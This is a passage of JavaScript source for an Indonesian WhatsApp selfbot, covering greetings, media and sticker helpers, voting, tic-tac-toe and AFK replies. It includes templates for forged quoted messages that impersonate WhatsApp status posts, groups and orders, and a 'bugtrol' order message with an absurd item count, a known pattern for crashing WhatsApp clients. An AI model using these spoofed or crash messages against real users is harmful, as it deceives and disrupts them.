			const hariRaya = new Date('Jan 12, 2022 07:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
			var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Sunday"; break;
                case 1: hari = "Monday"; break;
                case 2: hari = "Tuesday"; break;
                case 3: hari = "Wednesday"; break;
                case 4: hari = "Thursday"; break;
                case 5: hari = "Friday"; break;
                case 6: hari = "Saturday"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "January"; break;
                case 1: bulan1 = "February"; break;
                case 2: bulan1 = "March"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "May"; break;
                case 5: bulan1 = "June"; break;
                case 6: bulan1 = "July"; break;
                case 7: bulan1 = "August"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "October"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "December"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + "Time : " + wib;     
            
            myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
                myDays = ['Minggu','Senin','Selasa','Rabu','Kamis',"Jum'at",'Sabtu'];
                var tgl = new Date();
                detik = tgl.getSeconds();
                menit = tgl.getMinutes();
                jam = tgl.getHours();
	            var ampm = jam >= 12 ? 'PM' : 'AM';
	            var day = tgl.getDate()
	            bulan = tgl.getMonth()
	            var thisDay = tgl.getDay(),
	            thisDay = myDays[thisDay];
	            var yy = tgl.getYear()
	            var year = (yy < 1000) ? yy + 1900 : yy;
	            const ini_tanggal = `${day} - ${myMonths[bulan]} - ${year}`
            
            const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
        if(time2 < "19:00:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
        if(time2 < "18:00:00"){
        var ucapannya2 = `Afternoon 🌅 ${pushname}`
}
        if(time2 < "15:00:00"){
        var ucapannya2 = `GoodDay 🌞 ${pushname}`
}
        if(time2 < "11:00:00"){
        var ucapannya2 = `Morning 🌄 ${pushname}`
}
        if(time2 < "05:00:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
function _0x4e45(_0x4e8b73,_0x2db95f){const _0x553354=_0x5533();return _0x4e45=function(_0x4e45e1,_0x5b26a4){_0x4e45e1=_0x4e45e1-0x76;let _0x557adc=_0x553354[_0x4e45e1];return _0x557adc;},_0x4e45(_0x4e8b73,_0x2db95f);}function _0x5533(){const _0x516b70=['catch','join','\x20⏲️\x20|\x20','307181SZxmPs','floor','4380XHlsWX','8MLUKsu','409362PgYSiM','322268kXuSte','uptime','5800VQatWW','663354GmlYJk','10vTioRs','padStart','I\x27m\x20Userbot\x20👾\x20|\x20Runtime\x20','setStatus','3861mgZSmQ','76702JcgLDj','toString','2ZaLfWc','5027jESttL'];_0x5533=function(){return _0x516b70;};return _0x5533();}const _0x16e292=_0x4e45;(function(_0x1fa937,_0x195ad4){const _0x3a9f53=_0x4e45,_0x5aa8e6=_0x1fa937();while(!![]){try{const _0x14241e=parseInt(_0x3a9f53(0x7a))/0x1*(-parseInt(_0x3a9f53(0x7c))/0x2)+parseInt(_0x3a9f53(0x85))/0x3+-parseInt(_0x3a9f53(0x86))/0x4*(parseInt(_0x3a9f53(0x8a))/0x5)+-parseInt(_0x3a9f53(0x89))/0x6+-parseInt(_0x3a9f53(0x81))/0x7*(parseInt(_0x3a9f53(0x84))/0x8)+-parseInt(_0x3a9f53(0x79))/0x9*(-parseInt(_0x3a9f53(0x88))/0xa)+parseInt(_0x3a9f53(0x7d))/0xb*(parseInt(_0x3a9f53(0x83))/0xc);if(_0x14241e===_0x195ad4)break;else _0x5aa8e6['push'](_0x5aa8e6['shift']());}catch(_0x469ac5){_0x5aa8e6['push'](_0x5aa8e6['shift']());}}}(_0x5533,0x27039));function clockString(_0x2c6545){const _0x4c5819=_0x4e45;let _0x5ea16d=isNaN(_0x2c6545)?'--':Math[_0x4c5819(0x82)](_0x2c6545/0x36ee80),_0x57c8ff=isNaN(_0x2c6545)?'--':Math[_0x4c5819(0x82)](_0x2c6545/0xea60)%0x3c,_0x497347=isNaN(_0x2c6545)?'--':Math['floor'](_0x2c6545/0x3e8)%0x3c;return[_0x5ea16d,_0x57c8ff,_0x497347]['map'](_0x4fc95c=>_0x4fc95c[_0x4c5819(0x7b)]()[_0x4c5819(0x76)](0x2,0x0))[_0x4c5819(0x7f)](':');}if(autobio){if(autobio===![])return;let settingstatus=0x0;if(new Date()*0x1-settingstatus>0x3e8){let _uptime=process[_0x16e292(0x87)]()*0x3e8,uptimer=clockString(_uptime);await alpha[_0x16e292(0x78)](_0x16e292(0x77)+uptimer+_0x16e292(0x80)+status)[_0x16e292(0x7e)](_0x1ccda0=>_0x1ccda0),settingstatus=new Date()*0x1;}}
		mess = {
			wait: '```[ ! ] Proses kak...```',
			success: '```[ ✓ ]``` Success',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'Itu bukan stiker',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Only Group',
				admin: 'Only Group Admin',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const sendMess = (hehe, teks) => {
            alpha.sendMessage(hehe, teks, text)
        }
        

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? alpha.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        const fakestatus = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            alpha.sendMessage(from, teks, image, {thumbnail:fs.readFileSync(`./image/${thumbnail}`),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`image/${thumbnail}`) //Gambarnye
					},
					"title": 'Whatsapp bot', 
					"description": "SELF BOT", 
					"currencyCode": "IDR",
					"priceAmount1000": "70000000",
					"retailerId": 'Whatsapp bot',
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
const bugtrol = { 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "359531915900587",
						"itemCount": 1000000000000,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${creator}`,
						"orderTitle": `${creator}`,
						"sellerJid": "62887435047326@s.whatsapp.net",
						"token": "AR5b5YFz2g4W5fYrjbeakPiI3/XxarATSeP+KLh+0FGwkw=="
					}}}
       const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: fs.readFileSync(`image/${thumbnail}`), surface: 200, message: `Whatsapp Bot 〽️\nBy ${ownername}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}},contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
        const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${creator}`,jpegThumbnail: fs.readFileSync(`image/${thumbnail}`)}}}
        const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
        const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `Whatsapp Bot 〽️\nBy ${ownername}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `さ ${pushname} さ\nᴄᴍᴅ ᴇxᴇᴄ : ${command}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fgclink2 = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'caption': `${creator}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const floc = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`), thumbnail: fs.readFileSync(`image/${thumbnail}`),sendEphemeral: true}}}
		var fakeReplyList = ['ftroli', 'fdoc', 'fvn', 'fgif', 'fgclink', 'fvideo', 'floc', 'fkontak']
		var fakeReply = fakeReplyList[Math.floor(Math.random() * fakeReplyList.length)];
const fakeitem = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`image/${thumbnail}`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`${setting.botname}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}})}
           
       const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './sticker' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './sticker' + names + '.png'
                    let asw = './sticker' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        alpha.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            const sendFileFromUrlF = async(link, type, options) => {
            	hasil = await getBuffer(link)
            alpha.sendMessage(from, hasil, type, options).catch(e => {
            	fetch(link).then((hasil) => {
            	alpha.sendMessage(from, hasil, type, options).catch(e => {
            	alpha.sendMessage(from, { url : link }, type, options).catch(e => {
            	fakegroup('Something Error')
            console.log(e)
            })
            })
            })
            })
           }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    alpha.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl(from, url, caption, mek, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return alpha.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
        const textImg = (teks) => {
            return alpha.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync(`image/${thumbnail}`)})
        }
        const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					alpha.sendMessage(to, media, sticker, mek)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					});
					});
				});
			}
			function jsonformat(string) {
  return JSON.stringify(string, null, 2)
}
			
			const sendFile = async(link, type, options) => {
hasil = await getBuffer(link)
alpha.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
alpha.sendMessage(from, hasil, type, options).catch(e => {
alpha.sendMessage(from, { url : link }, type, options).catch(e => {
reply2('Error!')
console.log(e)
})
})
})
})
}
			
if(isGroup && !isVote) {
if (budy.toLowerCase() === 'vote'){
let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6281804680327@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./lib/vote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `${enter}${enter}*Alasan*: ${_votes[0].reason}${enter}*Jumlah Vote* : ${vote.length} Vote${enter}*Durasi* : ${_votes[0].durasi} Menit${enter}` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}${enter}*Vote* : ${vote[i].voting}${enter}${enter}`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devote'){
const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '62887435047326@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' You have voted', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./lib/vote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `${enter}${enter}*Alasan*: ${_votes[0].reason}${enter}*Jumlah Vote* : ${vote.length} Vote${enter}*Durasi* : ${_votes[0].durasi} Menit${enter}${enter}` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}${enter}*Vote* : ${vote[i].voting}${enter}${enter}`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}	

const getWin = async(board) => {
    var x = ["❌"]
    var o = ["⭕️"]

    // Horizontal
    if (board[0] == x && board[1] == x && board[2] == x) return x
    if (board[3] == x && board[4] == x && board[5] == x) return x
    if (board[6] == x && board[7] == x && board[8] == x) return x
    if (board[0] == o && board[1] == o && board[2] == o) return o
    if (board[3] == o && board[4] == o && board[5] == o) return o
    if (board[6] == o && board[7] == o && board[8] == o) return o

    // Silang
    if (board[0] == x && board[4] == x && board[8] == x) return x
    if (board[2] == x && board[4] == x && board[6] == x) return x
    if (board[0] == o && board[4] == o && board[8] == o) return o
    if (board[2] == o && board[4] == o && board[6] == o) return o

    // Vertikal
    if (board[0] == x && board[3] == x && board[6] == x) return x
    if (board[1] == x && board[4] == x && board[7] == x) return x
    if (board[2] == x && board[5] == x && board[8] == x) return x
    if (board[0] == o && board[3] == o && board[6] == o) return o
    if (board[1] == o && board[4] == o && board[7] == o) return o
    if (board[2] == o && board[5] == o && board[8] == o) return o
    return false
}

// function for generate board for x and o or number
const generateBoard = async(board) => {
    var texts = ""
    var count = 0
    for (var x of board) {
        if (count % 3 == 0) {
            texts += "\n               "
        }
        texts += x
        count += 1
    }
    return texts
}
const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let winCounts = winawal - wn.win
                    if (winCounts <= 0) return alpha.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${winCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./src/tttwin.json', JSON.stringify(_win))
                return `${winCounts}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let loseCounts = loseawal - ls.lose
                    if (loseCounts <= 0) return alpha.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${loseCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./src/tttlose.json', JSON.stringify(_lose))
                return `${loseCounts}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah", "give up"].includes(budy) && !isCmd) {
        orangnye = sender
        teks = `@${orangnye.split("@")[0]} Menyerah${enter}_Yahaha_`
        return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./temp/" + from + ".json");
        })
        }
       
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            var { enemy, mode, board, step } = tictactoe[senderNumber]
            if ([X, O].includes(board[Number(budy) - 1])) return await reply2(`Angka ${budy} telah diisi`)
            var data = tictactoe[senderNumber]
            data["enemy"] = senderNumber
            mode = mode == X ? O : X
            data["mode"] = mode
            data["board"][Number(budy) - 1] = data["mode"]
            data["step"] += 1
            var player1 = enemy
            var player2 = senderNumber
            if (step % 2 == 0) {
                player1 = senderNumber
                player2 = enemy
            } else {
                mode = data["mode"] == X ? O : X
            }
            tictactoe[enemy] = data
            delete tictactoe[senderNumber]
            var teks = `🎮🎭 ${petik}TICTACTOE${petik} ??🎮${enter}•> Player 1 : @${player1.split("@")[0]} (${mode})`
            mode = mode == X ? O : X
            var text2 = `${enter}${enter}•> Player 2 : @${player2.split("@")[0]} (${mode})`
            var test = `${enter}_ketik nyerah untuk menyerah_`
            board = await generateBoard(data["board"])
            var win = await getWin(data["board"])
            if (win) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                if (win == mode) {
                    teks += `•> Lose : @${player1} 👻${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Win : @${player2} 🎉${enter}_© WhatsApp inc._`
                    return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player2}@s.whatsapp.net`, 1)
                        getLose(`${player1}@s.whatsapp.net`, 1)
                    })
                } else {
                    teks += `•> Win : @${player1} 🎉${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Lose : @${player2} 👻${enter}_© WhatsApp inc._`
                    return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player1}@s.whatsapp.net`, 1)
                        getLose(`${player2}@s.whatsapp.net`, 1)
                    })
                }
            }
            if (data["step"] == 9) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                teks += `•> Draw : @${player1} 🦁${enter}${enter}`
                teks += board
                teks += `${enter}${enter}•> Draw : @${player2} 🐯${enter}_© WhatsApp inc._`
                return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                    delete tictactoe[enemy]
                    fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                    fs.unlinkSync('./temp/' + from + '.json')
                })
            }
            player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
            teks += "\n"
            teks += board
            teks += text2
            teks += test
            return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
            })
        }
        if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (tttSkuy.status) return reply2(`Game telah dimulai sebelumnya!`)
		tttSkuy.status = true
		rand0m = [ tttSkuy.Z, tttSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
		nantang = O
                    pelawan = X
                
                var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                var penantang = `${tttSkuy.Z}@s.whatsapp.net`
                var lawan = `${tttSkuy.Y}@s.whatsapp.net`
                tesk = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}${enter}`
                var count = 0
                for (var x of board) {
                    if (count % 3 == 0) {
                        tesk += "\n               "
                    }
                    tesk += x
                    count += 1
                }
                tesk += `${enter}${enter}•> Player 2 : @${lawan.split("@")[0]} (${pelawan})${enter}_© WhatsApp inc._`
                return alpha.sendMessage(from, tesk, text, {quoted:mek, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
                    data["enemy"] = lawan.split("@")[0]
                    data["mode"] = pelawan
                    data["board"] = board
                    data["step"] = 0
                    tictactoe[penantang.split("@")[0]] = data
                    fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                })
                fs.unlinkSync("./temp/" + from + ".json");
	} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		alpha.sendMessage(from, `「 *Game Tictactoe Rejected* 」\n\n• @${tttSkuy.Y} yahaha cupu lo`, text, {quoted: mek, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./temp/" + from + ".json");
	}
}

    _sewa.expiredCheck(alpha, sewa)
    
  //FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
